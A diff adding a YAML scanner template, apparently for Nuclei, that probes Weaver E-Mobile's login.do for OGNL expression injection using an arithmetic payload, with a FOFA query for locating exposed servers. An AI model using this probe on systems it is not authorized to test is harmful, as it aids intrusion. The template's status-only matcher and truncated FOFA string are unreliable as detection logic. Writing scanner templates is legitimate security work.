@@ -1,0 +1,23 @@
+id: poc-lhflbbhsbwog2ql0
+info:
+  name: 泛微E-Mobile 存在Ognl表达式注入漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lhflbbhsbwog2ql0'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lhflbbhsbwog2ql0
+    fofa: body="serverTitle" && body="/emp" || body="移动管理平台-企业管理" || body="Weaver
+http:
+- raw:
+  - 'GET /login.do?message=%24%7B3.1415%2a3.1415%7D%0A HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
